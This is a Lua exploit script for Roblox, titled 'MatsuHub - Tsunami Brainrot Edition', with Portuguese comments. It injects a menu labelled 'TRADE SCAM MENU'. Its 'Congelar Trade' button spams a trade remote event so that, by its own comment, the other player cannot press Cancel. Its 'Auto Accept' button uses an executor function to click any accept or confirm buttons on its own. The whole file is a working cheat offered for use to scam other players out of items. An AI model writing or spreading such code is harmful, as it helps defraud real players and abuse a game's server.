-- [[ MATSUHUB - TSUNAMI BRAINROT EDITION ]] --
local player = game.Players.LocalPlayer
local sgui = Instance.new("ScreenGui", game:GetService("CoreGui"))
sgui.Name = "MatsuHubTsunami"

local BLUE = Color3.fromRGB(0, 85, 255)
local BLACK = Color3.fromRGB(10, 10, 10)
local WHITE = Color3.fromRGB(255, 255, 255)

-- Botão M (Toggle)
local ToggleBtn = Instance.new("TextButton", sgui)
ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
ToggleBtn.Position = UDim2.new(0, 10, 0, 150)
ToggleBtn.BackgroundColor3 = BLUE
ToggleBtn.Text = "M"
ToggleBtn.TextColor3 = WHITE
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 25
Instance.new("UICorner", ToggleBtn)

-- Painel Principal (Azul)
local MainFrame = Instance.new("Frame", sgui)
MainFrame.Size = UDim2.new(0, 260, 0, 200)
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -100)
MainFrame.BackgroundColor3 = BLUE
Instance.new("UICorner", MainFrame)

-- Painel Trade Scam (Preto)
local TradeFrame = Instance.new("Frame", sgui)
TradeFrame.Size = UDim2.new(0, 260, 0, 220)
TradeFrame.Position = UDim2.new(0.5, -130, 0.5, -110)
TradeFrame.BackgroundColor3 = BLACK
TradeFrame.Visible = false
Instance.new("UICorner", TradeFrame)
local stroke = Instance.new("UIStroke", TradeFrame)
stroke.Color = BLUE
stroke.Thickness = 2

local function createBtn(t, pos, frame, color, f)
    local b = Instance.new("TextButton", frame)
    b.Size, b.Position = UDim2.new(0.9, 0, 0, 45), pos
    b.BackgroundColor3, b.Text = color, t
    b.TextColor3, b.Font, b.TextSize = WHITE, Enum.Font.GothamBold, 13
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() f(b) end)
end

-- Botão no Menu Azul para abrir o Preto
createBtn("TRADE SCAM MENU", UDim2.new(0.05, 0, 0.3, 0), MainFrame, Color3.fromRGB(30,30,30), function()
    TradeFrame.Visible = not TradeFrame.Visible
end)

-- FUNÇÃO CONGELAR (Lag na Trade)
createBtn("Congelar Trade", UDim2.new(0.05, 0, 0.2, 0), TradeFrame, Color3.fromRGB(150, 0, 0), function(b)
    _G.Freeze = not _G.Freeze
    b.Text = _G.Freeze and "CONGELADO! ❄️" or "Congelar Trade"
    task.spawn(function()
        while _G.Freeze do
            pcall(function()
                -- Envia spam de pacotes de "Update" para travar o botão Cancelar do outro
                local remote = game:GetService("ReplicatedStorage"):FindFirstChild("TradeRemote") or game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
                if remote then
                    remote:FireServer("UpdateTrade", {}) -- Tenta sobrecarregar a trade
                end
            end)
            task.wait(0.01)
        end
    end)
end)

-- FUNÇÃO AUTO ACCEPT (Rápido)
createBtn("Auto Accept", UDim2.new(0.05, 0, 0.55, 0), TradeFrame, Color3.fromRGB(0, 150, 0), function(b)
    _G.AutoAcc = not _G.AutoAcc
    b.Text = _G.AutoAcc and "AUTO ACCEPT: ON" or "Auto Accept"
    task.spawn(function()
        while _G.AutoAcc do
            pcall(function()
                -- Procura por qualquer botão de confirmação na tela
                for _, v in pairs(player.PlayerGui:GetDescendants()) do
                    if v:IsA("TextButton") and (v.Text:lower():find("accept") or v.Text:lower():find("confirm")) then
                        firesignal(v.MouseButton1Click)
                    end
                end
            end)
            task.wait(0.05)
        end
    end)
end)

-- Toggle M
ToggleBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    if not MainFrame.Visible then TradeFrame.Visible = false end
end)
